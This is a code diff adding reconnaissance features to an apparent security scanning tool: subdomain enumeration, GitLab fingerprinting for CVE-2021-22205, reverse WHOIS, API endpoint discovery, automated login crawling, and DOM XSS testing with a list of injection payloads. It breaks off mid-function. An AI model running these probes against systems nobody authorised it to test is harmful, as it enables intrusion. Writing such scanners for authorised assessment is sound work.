@@ -14,8 +14,9 @@ import re
 import shutil
 import subprocess
 import tempfile
+import time
 from typing import List, Optional, Dict, Any
-from urllib.parse import urlparse
+from urllib.parse import parse_qsl, urljoin, urlparse
 
 from asm_bridge import ASMBridge, Finding
 
@@ -52,6 +53,41 @@ def run_subfinder(domain: str, bridge: ASMBridge, timeout: int = 300) -> List[st
             bridge.submit_subdomain(host, source="subfinder")
     bridge.flush()
     logger.info(f"subfinder: {len(subdomains)} subdomains for {domain}")
+    return subdomains
+
+
+def run_subcat(domain: str, bridge: ASMBridge, timeout: int = 180) -> List[str]:
+    """Passive subdomain enumeration via subcat (pip install subcat).
+
+    Aggregates 19 passive sources including dnsdumpster, hackertarget, anubis,
+    crt.sh, wayback, virustotal, securitytrails, shodan, and more.
+    Free-tier modules work without API keys; paid modules activate when
+    ~/.subcat/config.yaml is populated.
+
+    Reference: https://github.com/duty1g/subcat
+    """
+    if not _tool_available("subcat"):
+        logger.error("subcat not installed — run: pip install subcat")
+        return []
+
+    result = _run(["subcat", "-d", domain, "-silent"], timeout=timeout)
+    subdomains = []
+    for line in result.stdout.strip().splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        # Strip URL scheme if output was collected with extra flags
+        for prefix in ("https://", "http://"):
+            if line.startswith(prefix):
+                line = line[len(prefix):]
+                break
+        # Strip path/port
+        line = line.split("/")[0].split(":")[0].lower()
+        if line and "." in line and line != domain:
+            subdomains.append(line)
+            bridge.submit_subdomain(line, source="subcat")
+    bridge.flush()
+    logger.info(f"subcat: {len(subdomains)} subdomains for {domain}")
     return subdomains
 
 
@@ -374,6 +410,219 @@ def run_wafw00f(target: str, bridge: ASMBridge, timeout: int = 120) -> Optional[
     return waf
 
 
+_KNOWN_GITLAB_ASSET_HASHES: Dict[str, Dict[str, Any]] = {
+    # Seen in public reporting as useful for GitLab CE version correlation.
+    # Keep version empty unless a local hash DB confirms the exact release.
+    "4a081f9e3a60a0e580cad484d66fbf5a1505ad313280e96728729069f87f856e": {
+        "product": "GitLab CE",
+        "notes": "Known GitLab /help stylesheet hash; provide GITLAB_HASH_DB_PATH for exact version mapping.",
+        "cve_candidates": ["CVE-2021-22205"],
+    },
+}
+
+
+def _load_gitlab_hash_db(db_path: str = "") -> Dict[str, Dict[str, Any]]:
+    path = db_path or os.environ.get("GITLAB_HASH_DB_PATH", "")
+    db = dict(_KNOWN_GITLAB_ASSET_HASHES)
+    if not path:
+        return db
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+    except Exception as e:
+        logger.warning(f"failed to load GitLab hash DB {path}: {e}")
+        return db
+
+    if isinstance(data, dict):
+        for asset_hash, record in data.items():
+            if isinstance(record, str):
+                db[asset_hash.lower()] = {"version": record}
+            elif isinstance(record, dict):
+                db[asset_hash.lower()] = record
+    elif isinstance(data, list):
+        for item in data:
+            if not isinstance(item, dict):
+                continue
+            asset_hash = str(item.get("hash") or item.get("sha256") or "").lower()
+            if asset_hash:
+                db[asset_hash] = item
+    return db
+
+
+def _parse_version_tuple(version: str) -> tuple:
+    match = re.search(r"(\d+)\.(\d+)\.(\d+)", version or "")
+    if not match:
+        return ()
+    return tuple(int(part) for part in match.groups())
+
+
+def _gitlab_cve_2021_22205_risk(version: str) -> str:
+    """Return vulnerable/patched/unknown for GitLab CVE-2021-22205 by version."""
+    v = _parse_version_tuple(version)
+    if not v:
+        return "unknown"
+    major, minor, patch = v
+    if major < 11 or (major == 11 and minor < 9):
+        return "unknown"
+    if major < 13:
+        return "vulnerable"
+    if major > 13:
+        return "patched"
+    if minor < 8:
+        return "vulnerable"
+    if minor == 8:
+        return "patched" if patch >= 8 else "vulnerable"
+    if minor == 9:
+        return "patched" if patch >= 6 else "vulnerable"
+    if minor == 10:
+        return "patched" if patch >= 3 else "vulnerable"
+    return "patched"
+
+
+def run_gitlab_fingerprint(
+    target_url: str,
+    bridge: ASMBridge,
+    hash_db_path: str = "",
+    timeout: int = 30,
+    max_assets: int = 20,
+) -> Dict[str, Any]:
+    """Fingerprint GitLab by hashing /help stylesheet assets.
+
+    This mirrors the Praetorian-style blackbox technique without exploitation:
+    collect stylesheet URLs from /help, compute SHA-256 hashes, and correlate
+    them against a local hash database when available.
+    """
+    import httpx
+
+    base = target_url.rstrip("/")
+    parsed = urlparse(base)
+    if not parsed.scheme:
+        base = f"https://{base}"
+        parsed = urlparse(base)
+    help_url = urljoin(base + "/", "help")
+    hash_db = _load_gitlab_hash_db(hash_db_path)
+    assets: List[Dict[str, Any]] = []
+    matches: List[Dict[str, Any]] = []
+    is_gitlab = False
+
+    try:
+        with httpx.Client(
+            timeout=timeout,
+            follow_redirects=True,
+            verify=False,
+            headers={"User-Agent": "AegisVanguard-GitLab-Fingerprint/1.0"},
+        ) as client:
+            response = client.get(help_url)
+            body = response.text or ""
+            headers = response.headers or {}
+            is_gitlab = (
+                "gitlab" in body[:20000].lower()
+                or "gitlab" in str(headers).lower()
+                or "/assets/application-" in body
+            )
+            stylesheet_paths = re.findall(
+                r"""<link[^>]+href=["']([^"']+\.css(?:\?[^"']*)?)["']""",
+                body,
+                flags=re.I,
+            )
+            for href in stylesheet_paths[: max(1, min(int(max_assets or 20), 50))]:
+                asset_url = urljoin(help_url, href)
+                try:
+                    asset_response = client.get(asset_url)
+                    content = asset_response.content or b""
+                except Exception as e:
+                    assets.append({"url": asset_url, "ok": False, "error": str(e)})
+                    continue
+                sha256 = hashlib.sha256(content).hexdigest()
+                asset = {
+                    "url": asset_url,
+                    "ok": asset_response.status_code < 400,
+                    "status_code": asset_response.status_code,
+                    "sha256": sha256,
+                    "bytes": len(content),
+                }
+                record = hash_db.get(sha256)
+                if record:
+                    asset["hash_db_match"] = record
+                    version = str(record.get("version") or "")
+                    risk = _gitlab_cve_2021_22205_risk(version)
+                    match = {
+                        "asset_url": asset_url,
+                        "sha256": sha256,
+                        "version": version or None,
+                        "record": record,
+                        "cve_2021_22205_risk": risk,
+                    }
+                    matches.append(match)
+                assets.append(asset)
+    except Exception as e:
+        return {
+            "success": False,
+            "target_url": target_url,
+            "help_url": help_url,
+            "error": str(e),
+        }
+
+    versions = sorted({m["version"] for m in matches if m.get("version")})
+    risk = "unknown"
+    if any(m.get("cve_2021_22205_risk") == "vulnerable" for m in matches):
+        risk = "vulnerable"
+    elif matches and all(m.get("cve_2021_22205_risk") == "patched" for m in matches if m.get("version")):
+        risk = "patched"
+
+    host = parsed.hostname or target_url
+    result = {
+        "success": True,
+        "target_url": target_url,
+        "help_url": help_url,
+        "is_probable_gitlab": is_gitlab or bool(matches),
+        "versions": versions,
+        "asset_count": len(assets),
+        "matches": matches,
+        "assets": assets,
+        "cve_2021_22205_risk": risk,
+    }
+
+    if result["is_probable_gitlab"]:
+        bridge.submit_finding(Finding(
+            type="technology",
+            source="gitlab-fingerprint",
+            target=host,
+            host=host,
+            url=help_url,
+            title=f"GitLab fingerprinted: {host}",
+            severity="info" if risk != "vulnerable" else "high",
+            confidence="high" if matches else "medium",
+            technologies=["GitLab"],
+            tags=["gitlab", "asset-hash", f"cve-2021-22205:{risk}"],
+            raw_data=result,
+        ))
+        if risk == "vulnerable":
+            bridge.submit_vulnerability(
+                host=host,
+                title="GitLab version potentially vulnerable to CVE-2021-22205",
+                severity="critical",
+                source="gitlab-fingerprint",
+                url=help_url,
+                description=(
+                    "GitLab stylesheet hash correlation mapped this instance to a "
+                    "version in the vulnerable CVE-2021-22205 range. This is a "
+                    "non-destructive fingerprint; exploit validation requires "
+                    "explicit authorization and an approved OOB collaborator."
+                ),
+                confidence="medium",
+                cve_id="CVE-2021-22205",
+                tags=["gitlab", "cve-2021-22205", "fingerprint"],
+                raw_data=result,
+            )
+    bridge.flush()
+    logger.info(
+        "gitlab fingerprint: probable=%s matches=%d risk=%s target=%s",
+        result["is_probable_gitlab"], len(matches), risk, target_url,
+    )
+    return result
+
+
 # =========================================================================
 # SSL/TLS Testing
 # =========================================================================
@@ -543,6 +792,182 @@ def run_arjun(target_url: str, bridge: ASMBridge, timeout: int = 300) -> List[st
 # =========================================================================
 # Secret & Code Scanning
 # =========================================================================
+
+def _parse_csv_lines(value: str, max_items: Optional[int] = None) -> List[str]:
+    items: List[str] = []
+    for line in str(value or "").replace(",", "\n").splitlines():
+        item = line.strip()
+        if item and item not in items:
+            items.append(item)
+            if max_items and len(items) >= max_items:
+                break
+    return items
+
+
+def _extract_reverse_whois_domains(payload: Dict[str, Any]) -> List[str]:
+    """Handle common WhoisXML reverse WHOIS response shapes defensively."""
+    domains: List[str] = []
+    candidates = [
+        payload.get("domainsList"),
+        payload.get("domains"),
+        payload.get("domainNames"),
+        payload.get("records"),
+    ]
+    for candidate in candidates:
+        if not isinstance(candidate, list):
+            continue
+        for item in candidate:
+            if isinstance(item, str):
+                domains.append(item.strip())
+            elif isinstance(item, dict):
+                for key in ("domainName", "domain", "name"):
+                    val = item.get(key)
+                    if isinstance(val, str):
+                        domains.append(val.strip())
+                        break
+    out: List[str] = []
+    seen = set()
+    for domain in domains:
+        domain = domain.lower().rstrip(".")
+        if domain and domain not in seen:
+            seen.add(domain)
+            out.append(domain)
+    return out
+
+
+def run_reverse_whois_search(
+    terms: str,
+    bridge: ASMBridge,
+    api_key: str = "",
+    search_type: str = "current",
+    mode: str = "preview",
+    exclude: str = "",
+    max_terms: int = 10,
+    max_domains: int = 500,
+    timeout: int = 60,
+) -> Dict[str, Any]:
+    """Reverse WHOIS pivot via WhoisXML API.
+
+    Searches WHOIS records for brand names, organization names, emails, known
+    domains, or other unique strings. Defaults to preview mode to avoid
+    unexpected paid domain-list retrieval.
+    """
+    key = (
+        api_key
+        or os.environ.get("WHOISXML_API_KEY", "")
+        or os.environ.get("WHOISXML_API", "")
+    )
+    if not key:
+        return {
+            "success": False,
+            "error": "WHOISXML_API_KEY or WHOISXML_API is required",
+            "terms": [],
+            "results": [],
+        }
+
+    normalized_mode = (mode or "preview").lower().strip()
+    if normalized_mode not in ("preview", "purchase"):
+        normalized_mode = "preview"
+
+    normalized_search_type = (search_type or "current").lower().strip()
+    if normalized_search_type not in ("current", "historic"):
+        normalized_search_type = "current"
+
+    include_terms = _parse_csv_lines(terms, max_items=max(1, min(int(max_terms or 10), 50)))
+    exclude_terms = _parse_csv_lines(exclude, max_items=4)
+    if not include_terms:
+        return {"success": False, "error": "No search terms supplied", "results": []}
+
+    endpoint = "https://reverse-whois.whoisxmlapi.com/api/v2"
+    results: List[Dict[str, Any]] = []
+    discovered_domains: List[str] = []
+
+    import httpx
+
+    with httpx.Client(timeout=timeout) as client:
+        for term in include_terms:
+            request_body = {
+                "apiKey": key,
+                "basicSearchTerms": {
+                    "include": [term],
+                    "exclude": exclude_terms,
+                },
+                "searchType": normalized_search_type,
+                "mode": normalized_mode,
+                "punycode": True,
+            }
+            try:
+                response = client.post(
+                    endpoint,
+                    json=request_body,
+                    headers={"Content-Type": "application/json"},
+                )
+            except Exception as e:
+                results.append({"term": term, "ok": False, "error": str(e)})
+                continue
+
+            if response.status_code >= 400:
+                results.append({
+                    "term": term,
+                    "ok": False,
+                    "status_code": response.status_code,
+                    "error": response.text[:500],
+                })
+                continue
+
+            try:
+                payload = response.json()
+            except ValueError:
+                results.append({"term": term, "ok": False, "error": "Non-JSON response"})
+                continue
+
+            domains = _extract_reverse_whois_domains(payload)[:max_domains]
+            count = (
+                payload.get("domainsCount")
+                or payload.get("count")
+                or payload.get("total")
+                or len(domains)
+            )
+            result = {
+                "term": term,
+                "ok": True,
+                "mode": normalized_mode,
+                "search_type": normalized_search_type,
+                "domains_count": count,
+                "domains": domains,
+            }
+            results.append(result)
+            discovered_domains.extend(domains)
+
+            if normalized_mode == "preview":
+                bridge.submit_finding(Finding(
+                    type="osint",
+                    source="reverse-whois",
+                    target=term,
+                    title=f"Reverse WHOIS preview: {term}",
+                    severity="info",
+                    confidence="medium",
+                    description=f"WhoisXML reverse WHOIS preview returned {count} matching domain(s).",
+                    tags=["osint", "reverse-whois", normalized_search_type, "preview"],
+                    raw_data={k: v for k, v in result.items() if k != "domains"},
+                ))
+            else:
+                for domain in domains:
+                    bridge.submit_domain(domain, source="reverse-whois", raw_data={"search_term": term})
+
+    unique_domains = sorted({d for d in discovered_domains if d})
+    bridge.flush()
+    return {
+        "success": True,
+        "mode": normalized_mode,
+        "search_type": normalized_search_type,
+        "terms": include_terms,
+        "exclude": exclude_terms,
+        "results": results,
+        "domains": unique_domains[:max_domains],
+        "domain_count": len(unique_domains),
+    }
+
 
 def run_argus(
     path: str,
@@ -1513,8 +1938,10 @@ def run_full_recon(domain: str, bridge: ASMBridge) -> dict:
     logger.info(f"=== Full recon for {domain} ===")
     results = {"domain": domain}
 
-    # Phase 1: Subdomain discovery
-    subs = run_subfinder(domain, bridge)
+    # Phase 1: Subdomain discovery — run subfinder and subcat in parallel for maximum coverage
+    subs_subfinder = run_subfinder(domain, bridge)
+    subs_subcat = run_subcat(domain, bridge)
+    subs = list(set(subs_subfinder + subs_subcat))
     results["subdomains"] = len(subs)
 
     all_hosts = [domain] + subs
@@ -1582,3 +2009,1643 @@ def run_full_recon(domain: str, bridge: ASMBridge) -> dict:
 
     logger.info(f"=== Recon complete: {json.dumps(results, indent=2)} ===")
     return results
+
+
+# =========================================================================
+# Playwright: Authenticated Browser Crawl
+# =========================================================================
+
+_API_PATH_HINTS = (
+    "/api/", "/apis/", "/v1/", "/v2/", "/v3/", "/graphql", "/graphql/",
+    "/rest/", "/rpc/", "/jsonrpc", "/webhook", "/webhooks/", "/socket.io/",
+    "/ws/", "/wss/", "/oauth/", "/auth/", "/sso/", "/admin/", "/internal/",
+)
+
+_SENSITIVE_API_HINTS = (
+    "admin", "internal", "private", "debug", "config", "settings", "billing",
+    "invoice", "payment", "user", "users", "account", "accounts", "profile",
+    "export", "download", "report", "token", "secret", "key", "credential",
+)
+
+
+def _is_probable_api_url(url: str, content_type: str = "") -> bool:
+    parsed = urlparse(url)
+    path = parsed.path.lower()
+    ctype = (content_type or "").lower()
+    if parsed.scheme in ("ws", "wss"):
+        return True
+    if any(hint in path for hint in _API_PATH_HINTS):
+        return True
+    if "application/json" in ctype or "graphql" in ctype:
+        return True
+    return path.endswith((".json", ".graphql"))
+
+
+def _classify_api_url(url: str, content_type: str = "") -> str:
+    parsed = urlparse(url)
+    path = parsed.path.lower()
+    ctype = (content_type or "").lower()
+    if parsed.scheme in ("ws", "wss") or "websocket" in ctype or "/socket.io/" in path:
+        return "websocket"
+    if "graphql" in path or "graphql" in ctype:
+        return "graphql"
+    if "jsonrpc" in path:
+        return "json-rpc"
+    if path.endswith(".wsdl") or "soap" in ctype:
+        return "soap"
+    return "rest"
+
+
+def _normalize_api_path(path: str) -> str:
+    parts = []
+    uuid_re = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
+    for part in path.split("/"):
+        if not part:
+            continue
+        if part.isdigit() or uuid_re.match(part):
+            parts.append(":id")
+        elif len(part) > 24 and re.match(r"^[A-Za-z0-9_-]+$", part):
+            parts.append(":token")
+        else:
+            parts.append(part)
+    return "/" + "/".join(parts)
+
+
+def _api_sensitivity(url: str, params: List[str]) -> List[str]:
+    parsed = urlparse(url)
+    haystack = f"{parsed.path.lower()} {' '.join(p.lower() for p in params)}"
+    return [hint for hint in _SENSITIVE_API_HINTS if hint in haystack]
+
+
+def _extract_urls_from_text(text: str, base_url: str) -> List[str]:
+    if not text:
+        return []
+    candidates = set()
+    absolute_re = re.compile(r"""(?:https?:)?//[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]+""")
+    relative_re = re.compile(r"""["'`](\/(?:api|apis|v[0-9]|graphql|rest|rpc|jsonrpc|webhook|ws|socket\.io|oauth|auth|admin|internal)[^"'`\s<>]*)""", re.I)
+    for match in absolute_re.findall(text):
+        url = "https:" + match if match.startswith("//") else match
+        candidates.add(url)
+    for match in relative_re.findall(text):
+        candidates.add(urljoin(base_url, match))
+    return sorted(candidates)
+
+
+def run_api_surface_discovery(
+    target_url: str,
+    bridge: ASMBridge,
+    timeout: int = 120,
+    max_pages: int = 20,
+) -> Dict[str, Any]:
+    """Discover API endpoints from browser traffic, links, scripts, and response metadata.
+
+    This is a blackbox-safe, Vespasian-style inventory pass: it observes what the
+    app already requests and extracts API-like routes. It does not mutate state,
+    brute force, or attempt authenticated authorization bypasses.
+    """
+    try:
+        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+    except ImportError:
+        logger.error("playwright not installed")
+        return {"success": False, "error": "playwright not installed", "endpoints": []}
+
+    parsed_target = urlparse(target_url)
+    base_origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
+    in_scope_hosts = {parsed_target.netloc}
+    endpoint_map: Dict[str, Dict[str, Any]] = {}
+    static_candidates: set = set()
+    pages_seen: set = set()
+    pages_to_visit: List[str] = [target_url]
+
+    def _in_scope(url: str) -> bool:
+        parsed = urlparse(url)
+        return parsed.netloc in in_scope_hosts or url.startswith("/")
+
+    def _record_endpoint(
+        url: str,
+        method: str = "GET",
+        status: Optional[int] = None,
+        content_type: str = "",
+        source: str = "browser",
+    ):
+        if not url or not (url.startswith("http://") or url.startswith("https://") or url.startswith("ws")):
+            return
+        parsed = urlparse(url)
+        if parsed.netloc not in in_scope_hosts:
+            return
+        params = sorted({name for name, _ in parse_qsl(parsed.query, keep_blank_values=True)})
+        normalized_path = _normalize_api_path(parsed.path or "/")
+        key = f"{method.upper()} {parsed.scheme}://{parsed.netloc}{normalized_path}"
+        api_type = _classify_api_url(url, content_type)
+        sensitive_hints = _api_sensitivity(url, params)
+
+        if key not in endpoint_map:
+            endpoint_map[key] = {
+                "method": method.upper(),
+                "url": url,
+                "origin": f"{parsed.scheme}://{parsed.netloc}",
+                "path": parsed.path or "/",
+                "normalized_path": normalized_path,
+                "api_type": api_type,
+                "parameters": params,
+                "status_codes": [],
+                "content_types": [],
+                "sources": [],
+                "auth_hint": "unknown",
+                "sensitive_hints": sensitive_hints,
+            }
+        endpoint = endpoint_map[key]
+        endpoint["parameters"] = sorted(set(endpoint["parameters"]) | set(params))
+        endpoint["sensitive_hints"] = sorted(set(endpoint["sensitive_hints"]) | set(sensitive_hints))
+        if status is not None and status not in endpoint["status_codes"]:
+            endpoint["status_codes"].append(status)
+        if content_type and content_type not in endpoint["content_types"]:
+            endpoint["content_types"].append(content_type)
+        if source not in endpoint["sources"]:
+            endpoint["sources"].append(source)
+        if status in (401, 403):
+            endpoint["auth_hint"] = "requires_auth"
+        elif status is not None and 200 <= status < 400 and endpoint["auth_hint"] == "unknown":
+            endpoint["auth_hint"] = "public_or_session_available"
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+        )
+        context = browser.new_context(
+            ignore_https_errors=True,
+            user_agent=(
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 "
+                "AegisVanguard-API-Discovery/1.0"
+            ),
+        )
+        page = context.new_page()
+
+        def _on_request(request):
+            url = request.url
+            if _in_scope(url) and _is_probable_api_url(url):
+                _record_endpoint(url, method=request.method, source="request")
+
+        def _on_response(response):
+            url = response.url
+            headers = response.headers or {}
+            content_type = headers.get("content-type", "")
+            if _in_scope(url) and _is_probable_api_url(url, content_type):
+                _record_endpoint(
+                    url,
+                    method=response.request.method,
+                    status=response.status,
+                    content_type=content_type.split(";")[0],
+                    source="response",
+                )
+
+        page.on("request", _on_request)
+        page.on("response", _on_response)
+
+        deadline = time.time() + max(10, timeout)
+        while pages_to_visit and len(pages_seen) < max_pages and time.time() < deadline:
+            url = pages_to_visit.pop(0)
+            if url in pages_seen:
+                continue
+            pages_seen.add(url)
+            try:
+                page.goto(url, wait_until="networkidle", timeout=20000)
+            except PWTimeout:
+                try:
+                    page.goto(url, wait_until="domcontentloaded", timeout=15000)
+                except Exception as e:
+                    logger.debug(f"api discovery navigation failed ({url[:80]}): {e}")
+                    continue
+            except Exception as e:
+                logger.debug(f"api discovery navigation failed ({url[:80]}): {e}")
+                continue
+
+            try:
+                body = page.content()
+                for candidate in _extract_urls_from_text(body, base_origin):
+                    if _in_scope(candidate):
+                        static_candidates.add(candidate)
+                        if _is_probable_api_url(candidate):
+                            _record_endpoint(candidate, source="html")
+
+                links = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
+                for link in links:
+                    if _in_scope(link) and link not in pages_seen and len(pages_to_visit) < max_pages:
+                        pages_to_visit.append(link)
+
+                scripts = page.eval_on_selector_all("script[src]", "els => els.map(e => e.src)")
+                for script_url in scripts[:30]:
+                    if not _in_scope(script_url):
+                        continue
+                    static_candidates.add(script_url)
+                    try:
+                        resp = context.request.get(script_url, timeout=10000)
+                        if resp.ok:
+                            for candidate in _extract_urls_from_text(resp.text(), base_origin):
+                                if _in_scope(candidate) and _is_probable_api_url(candidate):
+                                    _record_endpoint(candidate, source="javascript")
+                    except Exception:
+                        continue
+            except Exception as e:
+                logger.debug(f"api discovery extraction failed ({url[:80]}): {e}")
+
+        browser.close()
+
+    endpoints = sorted(
+        endpoint_map.values(),
+        key=lambda item: (item["api_type"], item["normalized_path"], item["method"]),
+    )
+
+    for endpoint in endpoints:
+        host = urlparse(endpoint["url"]).hostname or parsed_target.hostname or target_url
+        severity = "medium" if endpoint.get("sensitive_hints") and endpoint.get("auth_hint") == "public_or_session_available" else "info"
+        bridge.submit_finding(Finding(
+            type="api_endpoint",
+            source="api-surface-discovery",
+            target=host,
+            host=host,
+            url=endpoint["url"],
+            title=f"API endpoint discovered: {endpoint['method']} {endpoint['normalized_path']}",
+            severity=severity,
+            confidence="high" if endpoint.get("status_codes") else "medium",
+            tags=["api", endpoint["api_type"], endpoint["auth_hint"]] + [
+                f"sensitive:{hint}" for hint in endpoint.get("sensitive_hints", [])
+            ],
+            raw_data=endpoint,
+        ))
+        bridge.submit_url(endpoint["url"], source="api-surface-discovery")
+    bridge.flush()
+
+    summary = {
+        "success": True,
+        "target_url": target_url,
+        "pages_observed": len(pages_seen),
+        "endpoints": endpoints[:300],
+        "endpoint_count": len(endpoints),
+        "by_type": {},
+        "sensitive_count": sum(1 for e in endpoints if e.get("sensitive_hints")),
+        "auth_required_count": sum(1 for e in endpoints if e.get("auth_hint") == "requires_auth"),
+        "public_or_session_available_count": sum(
+            1 for e in endpoints if e.get("auth_hint") == "public_or_session_available"
+        ),
+    }
+    for endpoint in endpoints:
+        api_type = endpoint["api_type"]
+        summary["by_type"][api_type] = summary["by_type"].get(api_type, 0) + 1
+    logger.info(
+        "api discovery: %d endpoints across %d pages for %s",
+        len(endpoints), len(pages_seen), target_url,
+    )
+    return summary
+
+def _playwright_try_login(page, username: str, password: str) -> bool:
+    """Fill and submit a login form on the current page. Returns True if attempted."""
+    try:
+        # Common username/email field selectors, tried in order
+        for sel in [
+            "input[name='username']", "input[name='email']", "input[name='user']",
+            "input[type='email']", "input[id*='user' i]", "input[id*='email' i]",
+            "input[placeholder*='user' i]", "input[placeholder*='email' i]",
+        ]:
+            if page.locator(sel).count() > 0:
+                page.fill(sel, username)
+                break
+
+        # Common password field selectors
+        for sel in ["input[type='password']", "input[name='password']", "input[id*='pass' i]"]:
+            if page.locator(sel).count() > 0:
+                page.fill(sel, password)
+                break
+
+        # Submit button selectors
+        for sel in [
+            "button[type='submit']", "input[type='submit']",
+            "button:has-text('Login')", "button:has-text('Sign in')",
+            "button:has-text('Log in')", "button:has-text('Submit')",
+        ]:
+            if page.locator(sel).count() > 0:
+                page.click(sel)
+                page.wait_for_load_state("networkidle", timeout=10000)
+                logger.info("playwright: login form submitted")
+                return True
+    except Exception as e:
+        logger.warning(f"playwright: login attempt failed: {e}")
+    return False
+
+
+def run_playwright_crawl_authenticated(
+    target_url: str,
+    bridge: ASMBridge,
+    username: str = "",
+    password: str = "",
+    timeout: int = 120,
+) -> List[str]:
+    """Browser-based crawl using Playwright/Chromium.
+
+    Handles JS-rendered SPAs, dynamic routes, and optional authentication.
+    Captures all in-scope URLs surfaced during real browser navigation, including
+    routes that only appear after user interaction or JS execution.
+    """
+    try:
+        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+    except ImportError:
+        logger.error("playwright not installed")
+        return []
+
+    parsed = urlparse(target_url)
+    base_origin = f"{parsed.scheme}://{parsed.netloc}"
+    discovered_urls: List[str] = []
+    visited: set = set()
+
+    def _in_scope(url: str) -> bool:
+        return isinstance(url, str) and url.startswith(base_origin)
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+        )
+        context = browser.new_context(
+            ignore_https_errors=True,
+            user_agent=(
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 "
+                "AegisVanguard/1.0"
+            ),
+        )
+        page = context.new_page()
+
+        # Capture every in-scope network request as a discovered URL
+        def _on_request(request):
+            url = request.url
+            if _in_scope(url) and url not in visited:
+                visited.add(url)
+                discovered_urls.append(url)
+                bridge.submit_url(url, source="playwright")
+
+        page.on("request", _on_request)
+
+        try:
+            page.goto(target_url, wait_until="networkidle", timeout=30000)
+        except PWTimeout:
+            try:
+                page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
+            except Exception as e:
+                logger.warning(f"playwright: initial navigation failed: {e}")
+                browser.close()
+                return discovered_urls
+
+        # Attempt login if credentials provided
+        if username and password:
+            _playwright_try_login(page, username, password)
+            # Re-capture authenticated routes after login
+            try:
+                page.wait_for_load_state("networkidle", timeout=15000)
+            except PWTimeout:
+                pass
+
+        # BFS link-following crawl (up to 3 depths, 20 links per level)
+        to_visit = [target_url]
+        for _ in range(3):
+            next_batch: List[str] = []
+            for url in to_visit[:20]:
+                if url in visited:
+                    continue
+                try:
+                    page.goto(url, wait_until="networkidle", timeout=20000)
+                    visited.add(url)
+                    links = page.eval_on_selector_all(
+                        "a[href]", "els => els.map(e => e.href)"
+                    )
+                    for link in links:
+                        if _in_scope(link) and link not in visited:
+                            next_batch.append(link)
+                            if link not in discovered_urls:
+                                discovered_urls.append(link)
+                                bridge.submit_url(link, source="playwright")
+                except Exception:
+                    pass
+            if not next_batch:
+                break
+            to_visit = list(set(next_batch))
+
+        browser.close()
+
+    bridge.flush()
+    logger.info(f"playwright crawl: {len(discovered_urls)} URLs on {target_url}")
+    return discovered_urls
+
+
+# =========================================================================
+# Playwright: DOM XSS Testing
+# =========================================================================
+
+# Payloads that set a detectable window property on execution.
+# Using a property marker avoids needing alert() which is blocked in some
+# environments and avoids false positives from benign dialogs.
+_DOM_XSS_PAYLOADS = [
+    "<img src=x onerror=\"window.__vanguard_xss=document.location.href\">",
+    "<svg/onload=\"window.__vanguard_xss=document.location.href\">",
+    "\"><img src=x onerror=\"window.__vanguard_xss=document.location.href\">",
+    "';window.__vanguard_xss=document.location.href;//",
+    "<script>window.__vanguard_xss=document.location.href</script>",
+    "<details open ontoggle=\"window.__vanguard_xss=document.location.href\">",
+    "<iframe srcdoc=\"<script>parent.window.__vanguard_xss=document.location.href</script>\">",
+]
+
+
+def run_dom_xss_test(
+    target_url: str,
+    bridge: ASMBridge,
+    params: str = "",
+    timeout: int = 60,
+) -> List[dict]:
+    """Test for DOM-based XSS using Playwright — detects payloads that execute in the
+    browser JS context but do not reflect in HTTP responses (missed by XSStrike/nuclei).
+
+    Injects into URL fragments (#), query parameters, and common sink vectors.
+    """
+    try:
+        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+    except ImportError:
+        logger.error("playwright not installed")
+        return []
+
+    parsed = urlparse(target_url)
+    param_list = [p.strip() for p in params.split(",") if p.strip()] if params else []
+
+    # Build test cases: fragment injection + per-parameter injection
+    test_cases: List[dict] = []
+    for payload in _DOM_XSS_PAYLOADS:
+        test_cases.append({
+            "url": f"{target_url}#{payload}",
+            "method": "fragment",
+            "payload": payload,
+        })
+        for param in param_list:
+            sep = "&" if "?" in target_url else "?"
+            test_cases.append({
+                "url": f"{target_url}{sep}{param}={payload}",
+                "method": f"param:{param}",
+                "payload": payload,
+            })
+
+    findings: List[dict] = []
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+        )
+        context = browser.new_context(ignore_https_errors=True)
+        page = context.new_page()
+
+        # Capture alert/confirm/prompt dialogs (classic XSS confirmation vector)
+        triggered_dialogs: List[str] = []
+        page.on("dialog", lambda d: (triggered_dialogs.append(d.message), d.dismiss()))
+
+        for tc in test_cases[:40]:
+            try:
+                page.goto(tc["url"], wait_until="domcontentloaded", timeout=10000)
+                page.wait_for_timeout(1200)
+
+                hit = page.evaluate("() => window.__vanguard_xss || null")
+                dialog_hit = triggered_dialogs[-1] if triggered_dialogs else None
+
+                if hit or dialog_hit:
+                    evidence = f"window.__vanguard_xss={hit}" if hit else f"dialog triggered: {dialog_hit}"
+                    finding = {
+                        "url": tc["url"],
+                        "payload": tc["payload"],
+                        "injection_method": tc["method"],
+                        "confirmed": True,
+                        "evidence": evidence,
+                    }
+                    findings.append(finding)
+                    bridge.submit_vulnerability(
+                        host=parsed.netloc,
+                        title=f"DOM XSS: {parsed.netloc}",
+                        severity="high",
+                        source="playwright-xss",
+                        url=tc["url"],
+                        description=(
+                            f"DOM-based XSS confirmed via Playwright. "
+                            f"Injection method: {tc['method']}. "
+                            f"Evidence: {evidence}"
+                        ),
+                        confidence="confirmed",
+                        tags=["xss", "dom-xss", "playwright", "confirmed"],
